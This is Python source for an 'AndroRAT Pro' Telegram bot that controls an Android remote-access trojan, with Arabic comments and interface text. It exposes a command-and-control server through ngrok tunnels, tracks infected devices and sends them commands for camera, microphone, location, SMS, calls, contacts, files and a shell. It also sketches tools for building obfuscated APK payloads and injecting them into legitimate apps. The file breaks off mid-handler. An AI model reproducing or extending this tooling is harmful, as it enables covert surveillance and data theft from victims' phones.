
# إنشاء نسخة متقدمة ومحسنة من البوت مع دعم Ngrok

advanced_bot_code = ''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🤖 AndroRAT Pro Controller Bot
═══════════════════════════════════════════════════════════════
بوت تحكم متقدم في أجهزة Android مع دعم Ngrok و Tunneling
المميزات:
- دعم Ngrok تلقائي مع إدارة النفق
- نظام Payloads ذكي مع Obfuscation
- مراقبة حية (Live Monitoring)
- نظام Geofencing متقدم
- تشفير الاتصالات (End-to-End Encryption)
- نظام Plugins قابل للتوسع
- دعم Multi-Session
- نظام Logs متقدم
"""

import logging
import json
import os
import re
import sys
import time
import asyncio
import hashlib
import base64
import subprocess
import threading
import queue
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Any, Callable, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path
import tempfile
import shutil

# Telegram
from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup, Update, 
    InputFile, BotCommand, MenuButtonCommands
)
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler, 
    ContextTypes, MessageHandler, filters, ConversationHandler
)
from telegram.constants import ParseMode

# HTTP & Networking
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import socket
import urllib.parse

# Security & Crypto
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Monitoring & System
import psutil

# Configuration
from configparser import ConfigParser

# ═══════════════════════════════════════════════════════════════
# إعدادات التسجيل واللوج
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler("bot_advanced.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════
# الثوابت والإعدادات
# ═══════════════════════════════════════════════════════════════

class Config:
    """إعدادات البوت"""
    # Telegram
    BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
    AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]
    
    # Server
    CONTROL_SERVER_URL = os.getenv("CONTROL_SERVER_URL", "http://127.0.0.1:8080")
    LOCAL_PORT = int(os.getenv("LOCAL_PORT", "8080"))
    
    # Ngrok
    NGROK_AUTH_TOKEN = os.getenv("NGROK_AUTH_TOKEN", "")
    NGROK_REGION = os.getenv("NGROK_REGION", "us")  # us, eu, au, ap, sa, jp, in
    NGROK_DOMAIN = os.getenv("NGROK_DOMAIN", "")  # نطاق مخصص (اختياري)
    
    # Paths
    BASE_DIR = Path(__file__).parent
    DEVICES_DB = BASE_DIR / "data" / "devices.json"
    PAYLOADS_DIR = BASE_DIR / "payloads"
    LOGS_DIR = BASE_DIR / "logs"
    TEMP_DIR = BASE_DIR / "temp"
    
    # Security
    ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "")
    MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
    SESSION_TIMEOUT = 3600  # 1 hour
    
    # Features
    AUTO_RECONNECT = True
    HEARTBEAT_INTERVAL = 30
    MAX_RETRIES = 3

# إنشاء المجلدات
for dir_path in [Config.DEVICES_DB.parent, Config.PAYLOADS_DIR, Config.LOGS_DIR, Config.TEMP_DIR]:
    dir_path.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════
# أنواع البيانات والفئات
# ═══════════════════════════════════════════════════════════════

class DeviceStatus(Enum):
    ONLINE = "online"
    OFFLINE = "offline"
    BUSY = "busy"
    ERROR = "error"
    UNKNOWN = "unknown"

@dataclass
class Device:
    """نموذج الجهاز"""
    id: str
    name: str
    ip: str
    port: int = 8080
    status: str = "offline"
    last_seen: str = ""
    added_at: str = ""
    system_info: Dict = None
    battery_level: int = 0
    network_type: str = ""
    ngrok_url: str = ""
    
    def __post_init__(self):
        if not self.last_seen:
            self.last_seen = datetime.now().isoformat()
        if not self.added_at:
            self.added_at = datetime.now().isoformat()
        if self.system_info is None:
            self.system_info = {}

@dataclass
class NgrokTunnel:
    """نموذج نفق Ngrok"""
    name: str
    public_url: str
    local_addr: str
    proto: str
    region: str
    metrics: Dict = None
    
    def __post_init__(self):
        if self.metrics is None:
            self.metrics = {}

@dataclass
class CommandLog:
    """سجل الأمر"""
    id: str
    device_id: str
    command: str
    status: str
    result: str
    timestamp: str
    duration: float = 0.0
    
    def to_dict(self):
        return asdict(self)

# ═══════════════════════════════════════════════════════════════
# نظام التشفير
# ═══════════════════════════════════════════════════════════════

class CryptoManager:
    """مدير التشفير"""
    
    def __init__(self, key: str = None):
        if not CRYPTO_AVAILABLE:
            logger.warning("مكتبة cryptography غير متوفرة - التشفير معطل")
            self.cipher = None
            return
            
        if key:
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'andro_rat_salt',
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(key.encode()))
            self.cipher = Fernet(key)
        else:
            self.cipher = None
    
    def encrypt(self, data: str) -> str:
        if not self.cipher:
            return data
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt(self, data: str) -> str:
        if not self.cipher:
            return data
        return self.cipher.decrypt(data.encode()).decode()
    
    @staticmethod
    def generate_key() -> str:
        return Fernet.generate_key().decode()

# ═══════════════════════════════════════════════════════════════
# نظام Ngrok المتقدم
# ═══════════════════════════════════════════════════════════════

class NgrokManager:
    """مدير Ngrok المتقدم"""
    
    def __init__(self):
        self.process: Optional[subprocess.Popen] = None
        self.api_url = "http://127.0.0.1:4040"
        self.tunnels: List[NgrokTunnel] = []
        self.session = requests.Session()
        self._monitor_thread: Optional[threading.Thread] = None
        self._stop_monitoring = threading.Event()
        
    def is_installed(self) -> bool:
        """التحقق من تثبيت Ngrok"""
        return shutil.which("ngrok") is not None
    
    def install(self) -> bool:
        """تثبيت Ngrok تلقائياً"""
        try:
            system = sys.platform
            if system == "linux":
                cmd = """curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo \\"deb https://ngrok-agent.s3.amazonaws.com buster main\\" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok"""
            elif system == "darwin":
                cmd = "brew install ngrok/ngrok/ngrok"
            else:
                logger.error(f"نظام غير مدعوم: {system}")
                return False
            
            subprocess.run(cmd, shell=True, check=True)
            return True
        except Exception as e:
            logger.error(f"فشل تثبيت Ngrok: {e}")
            return False
    
    def configure_auth(self, token: str) -> bool:
        """إعداد مصادقة Ngrok"""
        try:
            subprocess.run(["ngrok", "config", "add-authtoken", token], 
                          check=True, capture_output=True)
            return True
        except Exception as e:
            logger.error(f"فشل إعداد المصادقة: {e}")
            return False
    
    def start_tunnel(self, port: int, proto: str = "http", 
                     region: str = "us", domain: str = "") -> Optional[NgrokTunnel]:
        """بدء نفق جديد"""
        try:
            if self.process:
                self.stop()
            
            cmd = [
                "ngrok", proto, str(port),
                "--region", region,
                "--log", "stdout"
            ]
            
            if domain:
                cmd.extend(["--domain", domain])
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # انتظار بدء النفق
            time.sleep(3)
            
            # الحصول على معلومات النفق
            tunnel = self._get_tunnel_info()
            if tunnel:
                self.tunnels.append(tunnel)
                self._start_monitoring()
                return tunnel
            
            return None
            
        except Exception as e:
            logger.error(f"فشل بدء النفق: {e}")
            return None
    
    def _get_tunnel_info(self) -> Optional[NgrokTunnel]:
        """الحصول على معلومات النفق من API"""
        try:
            response = self.session.get(f"{self.api_url}/api/tunnels", timeout=5)
            data = response.json()
            
            if data.get("tunnels"):
                tunnel_data = data["tunnels"][0]
                return NgrokTunnel(
                    name=tunnel_data.get("name", "unnamed"),
                    public_url=tunnel_data.get("public_url", ""),
                    local_addr=tunnel_data.get("config", {}).get("addr", ""),
                    proto=tunnel_data.get("proto", ""),
                    region=Config.NGROK_REGION
                )
            return None
        except Exception as e:
            logger.error(f"فشل الحصول على معلومات النفق: {e}")
            return None
    
    def _start_monitoring(self):
        """بدء مراقبة النفق"""
        if self._monitor_thread and self._monitor_thread.is_alive():
            return
            
        self._stop_monitoring.clear()
        self._monitor_thread = threading.Thread(target=self._monitor_loop)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()
    
    def _monitor_loop(self):
        """حلقة المراقبة"""
        while not self._stop_monitoring.is_set():
            try:
                metrics = self._get_metrics()
                if metrics:
                    for tunnel in self.tunnels:
                        tunnel.metrics = metrics
                time.sleep(10)
            except Exception as e:
                logger.error(f"خطأ في المراقبة: {e}")
                time.sleep(5)
    
    def _get_metrics(self) -> Dict:
        """الحصول على إحصائيات النفق"""
        try:
            response = self.session.get(f"{self.api_url}/api/metrics/http", timeout=5)
            return response.json()
        except:
            return {}
    
    def get_public_url(self) -> Optional[str]:
        """الحصول على الرابط العام"""
        if self.tunnels:
            return self.tunnels[0].public_url
        tunnel = self._get_tunnel_info()
        return tunnel.public_url if tunnel else None
    
    def stop(self):
        """إيقاف النفق"""
        self._stop_monitoring.set()
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except:
                self.process.kill()
            self.process = None
        self.tunnels.clear()
    
    def restart(self, port: int) -> Optional[NgrokTunnel]:
        """إعادة تشغيل النفق"""
        self.stop()
        return self.start_tunnel(port)
    
    def get_status(self) -> Dict:
        """الحصول على حالة Ngrok"""
        return {
            "running": self.process is not None and self.process.poll() is None,
            "tunnels": len(self.tunnels),
            "public_url": self.get_public_url(),
            "region": Config.NGROK_REGION
        }

# ═══════════════════════════════════════════════════════════════
# مدير الأجهزة المتقدم
# ═══════════════════════════════════════════════════════════════

class AdvancedDeviceManager:
    """مدير الأجهزة المتقدم"""
    
    def __init__(self, db_path: Path):
        self.db_path = db_path
        self.devices: Dict[str, Device] = {}
        self._lock = threading.RLock()
        self._load_devices()
    
    def _load_devices(self):
        """تحميل الأجهزة"""
        try:
            if self.db_path.exists():
                with open(self.db_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for item in data:
                        device = Device(**item)
                        self.devices[device.id] = device
        except Exception as e:
            logger.error(f"فشل تحميل الأجهزة: {e}")
    
    def _save_devices(self):
        """حفظ الأجهزة"""
        try:
            with self._lock:
                with open(self.db_path, 'w', encoding='utf-8') as f:
                    devices_list = [asdict(d) for d in self.devices.values()]
                    json.dump(devices_list, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"فشل حفظ الأجهزة: {e}")
    
    def add_device(self, device: Device) -> Tuple[bool, str]:
        """إضافة جهاز"""
        with self._lock:
            if device.id in self.devices:
                return False, "الجهاز موجود مسبقاً"
            
            self.devices[device.id] = device
            self._save_devices()
            return True, "تم إضافة الجهاز بنجاح"
    
    def remove_device(self, device_id: str) -> Tuple[bool, str]:
        """حذف جهاز"""
        with self._lock:
            if device_id not in self.devices:
                return False, "الجهاز غير موجود"
            
            del self.devices[device_id]
            self._save_devices()
            return True, "تم حذف الجهاز"
    
    def update_device(self, device_id: str, **kwargs) -> bool:
        """تحديث بيانات الجهاز"""
        with self._lock:
            if device_id not in self.devices:
                return False
            
            device = self.devices[device_id]
            for key, value in kwargs.items():
                if hasattr(device, key):
                    setattr(device, key, value)
            
            device.last_seen = datetime.now().isoformat()
            self._save_devices()
            return True
    
    def get_device(self, device_id: str) -> Optional[Device]:
        """الحصول على جهاز"""
        return self.devices.get(device_id)
    
    def get_all_devices(self) -> List[Device]:
        """الحصول على جميع الأجهزة"""
        return list(self.devices.values())
    
    def get_online_devices(self) -> List[Device]:
        """الحصول على الأجهزة المتصلة"""
        return [d for d in self.devices.values() if d.status == DeviceStatus.ONLINE.value]
    
    def update_status(self, device_id: str, status: str) -> bool:
        """تحديث حالة الجهاز"""
        return self.update_device(device_id, status=status)
    
    def get_statistics(self) -> Dict:
        """إحصائيات الأجهزة"""
        total = len(self.devices)
        online = len([d for d in self.devices.values() if d.status == DeviceStatus.ONLINE.value])
        offline = len([d for d in self.devices.values() if d.status == DeviceStatus.OFFLINE.value])
        
        return {
            "total": total,
            "online": online,
            "offline": offline,
            "online_percentage": (online / total * 100) if total > 0 else 0
        }

# ═══════════════════════════════════════════════════════════════
# نظام Logs المتقدم
# ═══════════════════════════════════════════════════════════════

class AdvancedLogger:
    """نظام تسجيل متقدم"""
    
    def __init__(self, logs_dir: Path):
        self.logs_dir = logs_dir
        self.command_logs: List[CommandLog] = []
        self.max_logs = 1000
        self._load_logs()
    
    def _load_logs(self):
        """تحميل السجلات"""
        try:
            log_file = self.logs_dir / "commands.json"
            if log_file.exists():
                with open(log_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.command_logs = [CommandLog(**item) for item in data[-self.max_logs:]]
        except Exception as e:
            logger.error(f"فشل تحميل السجلات: {e}")
    
    def _save_logs(self):
        """حفظ السجلات"""
        try:
            log_file = self.logs_dir / "commands.json"
            with open(log_file, 'w', encoding='utf-8') as f:
                data = [log.to_dict() for log in self.command_logs[-self.max_logs:]]
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"فشل حفظ السجلات: {e}")
    
    def log_command(self, device_id: str, command: str, 
                   status: str, result: str, duration: float = 0.0):
        """تسجيل أمر"""
        log = CommandLog(
            id=hashlib.md5(f"{time.time()}".encode()).hexdigest()[:12],
            device_id=device_id,
            command=command,
            status=status,
            result=result,
            timestamp=datetime.now().isoformat(),
            duration=duration
        )
        self.command_logs.append(log)
        self._save_logs()
    
    def get_logs(self, device_id: str = None, limit: int = 50) -> List[CommandLog]:
        """الحصول على السجلات"""
        logs = self.command_logs
        if device_id:
            logs = [log for log in logs if log.device_id == device_id]
        return logs[-limit:]
    
    def clear_logs(self):
        """مسح السجلات"""
        self.command_logs.clear()
        self._save_logs()

# ═══════════════════════════════════════════════════════════════
# HTTP Client متقدم
# ═══════════════════════════════════════════════════════════════

class AdvancedHTTPClient:
    """عميل HTTP متقدم"""
    
    def __init__(self):
        self.session = requests.Session()
        retry_strategy = Retry(
            total=Config.MAX_RETRIES,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.headers.update({
            'User-Agent': 'AndroRAT-Pro/2.0',
            'Accept': 'application/json'
        })
    
    def post(self, url: str, data: Dict = None, files: Dict = None, 
             timeout: int = 30) -> Tuple[bool, Any]:
        """إرسال طلب POST"""
        try:
            if files:
                response = self.session.post(url, data=data, files=files, timeout=timeout)
            else:
                response = self.session.post(url, json=data, timeout=timeout)
            
            response.raise_for_status()
            return True, response.json()
        except requests.exceptions.Timeout:
            return False, "انتهى وقت الانتظار"
        except requests.exceptions.ConnectionError:
            return False, "خطأ في الاتصال"
        except Exception as e:
            return False, str(e)
    
    def get(self, url: str, timeout: int = 10) -> Tuple[bool, Any]:
        """إرسال طلب GET"""
        try:
            response = self.session.get(url, timeout=timeout)
            response.raise_for_status()
            return True, response.json()
        except Exception as e:
            return False, str(e)

# ═══════════════════════════════════════════════════════════════
# Payload Generator متقدم
# ═══════════════════════════════════════════════════════════════

class PayloadGenerator:
    """مولد Payloads متقدم"""
    
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.templates_dir = output_dir / "templates"
        
    def generate_payload(self, host: str, port: int, 
                        name: str = "payload",
                        obfuscate: bool = True,
                        icon: Path = None) -> Tuple[bool, str]:
        """إنشاء Payload"""
        try:
            # هنا يمكن إضافة منطق إنشاء APK فعلي
            # هذا مثال محاكاة
            
            payload_info = {
                "host": host,
                "port": port,
                "name": name,
                "obfuscate": obfuscate,
                "created_at": datetime.now().isoformat(),
                "file_path": str(self.output_dir / f"{name}.apk")
            }
            
            # حفظ معلومات البايلود
            info_file = self.output_dir / f"{name}.json"
            with open(info_file, 'w', encoding='utf-8') as f:
                json.dump(payload_info, f, indent=2)
            
            return True, str(info_file)
        except Exception as e:
            return False, str(e)
    
    def inject_payload(self, original_apk: Path, host: str, 
                      port: int) -> Tuple[bool, str]:
        """حقن Payload في تطبيق موجود"""
        try:
            # منطق الحقن الفعلي يكون هنا
            output_name = f"injected_{original_apk.stem}.apk"
            output_path = self.output_dir / output_name
            
            # محاكاة عملية الحقن
            time.sleep(2)
            
            return True, str(output_path)
        except Exception as e:
            return False, str(e)
    
    def list_payloads(self) -> List[Dict]:
        """قائمة البايلودات"""
        payloads = []
        try:
            for file in self.output_dir.glob("*.json"):
                with open(file, 'r', encoding='utf-8') as f:
                    payloads.append(json.load(f))
        except Exception as e:
            logger.error(f"فشل قراءة البايلودات: {e}")
        return payloads

# ═══════════════════════════════════════════════════════════════
# إنشاء مثيلات الأنظمة
# ═══════════════════════════════════════════════════════════════

ngrok_manager = NgrokManager()
device_manager = AdvancedDeviceManager(Config.DEVICES_DB)
command_logger = AdvancedLogger(Config.LOGS_DIR)
http_client = AdvancedHTTPClient()
payload_generator = PayloadGenerator(Config.PAYLOADS_DIR)
crypto_manager = CryptoManager(Config.ENCRYPTION_KEY)

# ═══════════════════════════════════════════════════════════════
# أوامر البوت ومعالجاته
# ═══════════════════════════════════════════════════════════════

# حالات المحادثة
(SELECTING_DEVICE, ENTERING_SHELL_COMMAND, ENTERING_SEARCH_TERM,
 ENTERING_PAYLOAD_NAME, SELECTING_PAYLOAD_OPTIONS) = range(5)

def is_authorized(user_id: int) -> bool:
    """التحقق من الصلاحيات"""
    return user_id in Config.AUTHORIZED_USERS

def get_main_keyboard():
    """لوحة المفاتيح الرئيسية"""
    keyboard = [
        [InlineKeyboardButton("🌐 إدارة Ngrok", callback_data='ngrok_menu')],
        [InlineKeyboardButton("📱 إدارة الأجهزة", callback_data='devices_menu')],
        [InlineKeyboardButton("🛠️ إنشاء Payload", callback_data='payload_menu')],
        [InlineKeyboardButton("⚡ التحكم السريع", callback_data='quick_control')],
        [InlineKeyboardButton("📊 الإحصائيات", callback_data='statistics')],
        [InlineKeyboardButton("⚙️ الإعدادات", callback_data='settings')],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_ngrok_keyboard():
    """لوحة Ngrok"""
    status = ngrok_manager.get_status()
    status_emoji = "🟢" if status["running"] else "🔴"
    
    keyboard = [
        [InlineKeyboardButton(f"{status_emoji} حالة Ngrok", callback_data='ngrok_status')],
        [InlineKeyboardButton("▶️ تشغيل النفق", callback_data='ngrok_start'),
         InlineKeyboardButton("⏹️ إيقاف النفق", callback_data='ngrok_stop')],
        [InlineKeyboardButton("🔄 إعادة تشغيل", callback_data='ngrok_restart')],
        [InlineKeyboardButton("📋 نسخ الرابط", callback_data='ngrok_copy_url')],
        [InlineKeyboardButton("📊 إحصائيات النفق", callback_data='ngrok_metrics')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_main')],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_devices_keyboard():
    """لوحة الأجهزة"""
    devices = device_manager.get_all_devices()
    keyboard = []
    
    for device in devices[:10]:  # عرض أول 10 أجهزة
        status = "🟢" if device.status == DeviceStatus.ONLINE.value else "🔴"
        keyboard.append([InlineKeyboardButton(
            f"{status} {device.name}",
            callback_data=f'device_{device.id}'
        )])
    
    keyboard.extend([
        [InlineKeyboardButton("➕ إضافة جهاز", callback_data='add_device')],
        [InlineKeyboardButton("🔄 تحديث الحالة", callback_data='refresh_devices')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_main')],
    ])
    return InlineKeyboardMarkup(keyboard)

def get_device_control_keyboard(device_id: str):
    """لوحة تحكم الجهاز"""
    keyboard = [
        [
            InlineKeyboardButton("📷 كاميرا", callback_data=f'cam_{device_id}'),
            InlineKeyboardButton("🎤 تسجيل", callback_data=f'rec_{device_id}'),
            InlineKeyboardButton("📍 موقع", callback_data=f'loc_{device_id}'),
        ],
        [
            InlineKeyboardButton("📂 ملفات", callback_data=f'files_{device_id}'),
            InlineKeyboardButton("📱 معلومات", callback_data=f'info_{device_id}'),
            InlineKeyboardButton("💬 رسائل", callback_data=f'sms_{device_id}'),
        ],
        [
            InlineKeyboardButton("📞 مكالمات", callback_data=f'calls_{device_id}'),
            InlineKeyboardButton("📇 جهات", callback_data=f'contacts_{device_id}'),
            InlineKeyboardButton("📱 تطبيقات", callback_data=f'apps_{device_id}'),
        ],
        [
            InlineKeyboardButton("🔒 قفل", callback_data=f'lock_{device_id}'),
            InlineKeyboardButton("🔊 صوت", callback_data=f'vol_{device_id}'),
            InlineKeyboardButton("🔄 إعادة", callback_data=f'reboot_{device_id}'),
        ],
        [
            InlineKeyboardButton("💻 Shell", callback_data=f'shell_{device_id}'),
            InlineKeyboardButton("🔍 بحث", callback_data=f'search_{device_id}'),
            InlineKeyboardButton("📊 متقدم", callback_data=f'adv_{device_id}'),
        ],
        [InlineKeyboardButton("🔙 رجوع", callback_data='devices_menu')],
    ]
    return InlineKeyboardMarkup(keyboard)

# ═══════════════════════════════════════════════════════════════
# معالجات الأوامر
# ═══════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر البدء"""
    user = update.effective_user
    
    if not is_authorized(user.id):
        await update.message.reply_text("⛔ أنت غير مصرح لك باستخدام هذا البوت.")
        return
    
    # تعيين أوامر القائمة
    commands = [
        BotCommand("start", "بدء البوت"),
        BotCommand("ngrok", "إدارة Ngrok"),
        BotCommand("devices", "إدارة الأجهزة"),
        BotCommand("payload", "إنشاء Payload"),
        BotCommand("logs", "عرض السجلات"),
        BotCommand("status", "حالة النظام"),
        BotCommand("help", "المساعدة"),
    ]
    await context.bot.set_my_commands(commands)
    
    stats = device_manager.get_statistics()
    ngrok_status = ngrok_manager.get_status()
    
    welcome_text = f"""
🤖 <b>AndroRAT Pro Controller</b>
═══════════════════════════════

👋 أهلاً بك <b>{user.first_name}</b>!

📊 <b>إحصائيات سريعة:</b>
• الأجهزة المتصلة: <code>{stats['online']}/{stats['total']}</code>
• نسبة الاتصال: <code>{stats['online_percentage']:.1f}%</code>
🌐 <b>Ngrok:</b> <code>{"متصل" if ngrok_status['running'] else "غير متصل"}</code>

اختر من القائمة أدناه:
"""
    
    await update.message.reply_html(welcome_text, reply_markup=get_main_keyboard())

async def ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر Ngrok"""
    if not is_authorized(update.effective_user.id):
        return
    
    await update.message.reply_text(
        "🌐 <b>إدارة Ngrok</b>",
        parse_mode='HTML',
        reply_markup=get_ngrok_keyboard()
    )

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر الأجهزة"""
    if not is_authorized(update.effective_user.id):
        return
    
    await update.message.reply_text(
        "📱 <b>إدارة الأجهزة</b>",
        parse_mode='HTML',
        reply_markup=get_devices_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الأزرار"""
    query = update.callback_query
    await query.answer()
    
    if not is_authorized(query.from_user.id):
        await query.edit_message_text("⛔ غير مصرح.")
        return
    
    data = query.data
    chat_id = query.message.chat_id
    
    # التنقل الرئيسي
    if data == 'back_main':
        await query.edit_message_text(
            "🎮 <b>القائمة الرئيسية</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    
    elif data == 'ngrok_menu':
        await query.edit_message_text(
            "🌐 <b>إدارة Ngrok</b>\n\nتحكم في نفق Ngrok الخاص بك:",
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    elif data == 'devices_menu':
        await query.edit_message_text(
            "📱 <b>إدارة الأجهزة</b>\n\nاختر جهازاً للتحكم:",
            parse_mode='HTML',
            reply_markup=get_devices_keyboard()
        )
    
    # أوامر Ngrok
    elif data == 'ngrok_start':
        await query.edit_message_text("⏳ جاري تشغيل Ngrok...")
        
        if not ngrok_manager.is_installed():
            await query.edit_message_text(
                "⚠️ Ngrok غير مثبت. جاري التثبيت..."
            )
            if not ngrok_manager.install():
                await query.edit_message_text(
                    "❌ فشل تثبيت Ngrok. يرجى التثبيت يدوياً."
                )
                return
        
        if Config.NGROK_AUTH_TOKEN:
            ngrok_manager.configure_auth(Config.NGROK_AUTH_TOKEN)
        
        tunnel = ngrok_manager.start_tunnel(
            port=Config.LOCAL_PORT,
            region=Config.NGROK_REGION,
            domain=Config.NGROK_DOMAIN
        )
        
        if tunnel:
            text = f"""
✅ <b>تم تشغيل Ngrok بنجاح!</b>

🔗 <b>الرابط العام:</b>
<code>{tunnel.public_url}</code>

📍 <b>العنوان المحلي:</b> <code>{tunnel.local_addr}</code>
🌍 <b>المنطقة:</b> <code>{tunnel.region}</code>

💡 استخدم هذا الرابط في إعدادات Payload
"""
            await query.edit_message_text(
                text,
                parse_mode='HTML',
                reply_markup=get_ngrok_keyboard()
            )
        else:
            await query.edit_message_text(
                "❌ فشل تشغيل Ngrok. تحقق من السجلات."
            )
    
    elif data == 'ngrok_stop':
        ngrok_manager.stop()
        await query.edit_message_text(
            "⏹️ <b>تم إيقاف Ngrok</b>",
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    elif data == 'ngrok_restart':
        ngrok_manager.stop()
        tunnel = ngrok_manager.start_tunnel(Config.LOCAL_PORT)
        if tunnel:
            await query.edit_message_text(
                f"🔄 <b>تم إعادة التشغيل</b>\n\n🔗 <code>{tunnel.public_url}</code>",
                parse_mode='HTML',
                reply_markup=get_ngrok_keyboard()
            )
    
    elif data == 'ngrok_status':
        status = ngrok_manager.get_status()
        text = f"""
📊 <b>حالة Ngrok</b>

{"🟢 متصل" if status['running'] else "🔴 غير متصل"}
🔗 الرابط: <code>{status['public_url'] or 'غير متوفر'}</code>
🌍 المنطقة: <code>{status['region']}</code>
📊 عدد الأنفاق: <code>{status['tunnels']}</code>
"""
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    elif data == 'ngrok_copy_url':
        url = ngrok_manager.get_public_url()
        if url:
            await query.answer(f"الرابط: {url}", show_alert=True)
        else:
            await query.answer("لا يوجد رابط نشط", show_alert=True)
    
    elif data == 'ngrok_metrics':
        if ngrok_manager.tunnels:
            metrics = ngrok_manager.tunnels[0].metrics
            text = f"""
📈 <b>إحصائيات النفق</b>

<pre>{json.dumps(metrics, indent=2, ensure_ascii=False)}</pre>
"""
        else:
            text = "❌ لا توجد إحصائيات متوفرة"
        
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    # أوامر الأجهزة
    elif data.startswith('device_'):
        device_id = data.replace('device_', '')
        device = device_manager.get_device(device_id)
        
        if device:
            text = f"""
📱 <b>{device.name}</b>
🆔 <code>{device.id}</code>
📍 IP: <code>{device.ip}</code>
📊 الحالة: <code>{device.status}</code>
🔋 البطارية: <code>{device.battery_level}%</code>
🌐 الشبكة: <code>{device.network_type}</code>
⏰ آخر اتصال: <code>{device.last_seen[:19]}</code>
"""
            await query.edit_message_text(
                text,
                parse_mode='HTML',
                reply_markup=get_device_control_keyboard(device_id)
            )
        else:
            await query.edit_message_text("❌ الجهاز غير موجود")
    
    elif data == 'refresh_devices':
        # تحديث حالة الأجهزة
        for device in device_manager.get_all_devices():
            # محاكاة فحص الحالة
            pass
        
        await query.edit_message_text(
            "📱 <b>تم تحديث الأجهزة</b>",
            parse_mode='HTML',
            reply_markup=get_devices_keyboard()
        )
    
    # أوامر التحكم في الجهاز
    elif data.startswith(('cam_', 'rec_', 'loc_', 'files_', 'info_', 
                         'sms_', 'calls_', 'contacts_', 'apps_',
                         'lock_', 'vol_', 'reboot_', 'shell_', 'search_')):
        
        action, device_id = data.split('_', 1)
        
        # تنفيذ الأمر عبر السيرفر
        success, result = http_client.post(
            f"{Config.CONTROL_SERVER_URL}/execute",
            {
                "device_id": device_id,
                "action": action,
                "timestamp": datetime.now().isoformat()
            }
        )
        
        if success:
            command_logger.log_command(device_id, action, "success", str(result))
            await query.answer("✅ تم تنفيذ الأمر")
            
            # إرسال النتيجة
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"✅ <b>نتيجة الأمر:</b>\n<pre>{json.dumps(result, indent=2, ensure_ascii=False)[:4000]}</pre>",
                parse_mode='HTML'
            )
        else:
            command_logger.log_command(device_id, action, "failed", str(result))
            await query.answer(f"❌ فشل: {result}", show_alert=True)
    
    elif data == 'statistics':
        stats = device_manager.get_statistics()
        ngrok_status = ngrok_manager.get_status()
        
        text = f"""
📊 <b>إحصائيات النظام</b>
═══════════════════

📱 <b>الأجهزة:</b>
• الإجمالي: <code>{stats['total']}</code>
• المتصلة: <code>{stats['online']}</code>
• غير المتصلة: <code>{stats['offline']}</code>
• النسبة: <code>{stats['online_percentage']:.1f}%</code>

🌐 <b>Ngrok:</b>
• الحالة: <code>{"متصل" if ngrok_status['running'] else "غير متصل"}</code>
• الرابط: <code>{ngrok_status['public_url'] or 'N/A'}</code>

⏰ <b>الوقت:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
"""
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    
    elif data == 'settings':
        text = f"""
⚙️ <b>الإعدادات</b>

🖥️ <b>السيرفر:</b> <code>{Config.CONTROL_SERVER_URL}</code>
🔌 <b>المنفذ المحلي:</b> <code>{Config.LOCAL_PORT}</code>
🌍 <b>منطقة Ngrok:</b> <code>{Config.NGROK_REGION}</code>
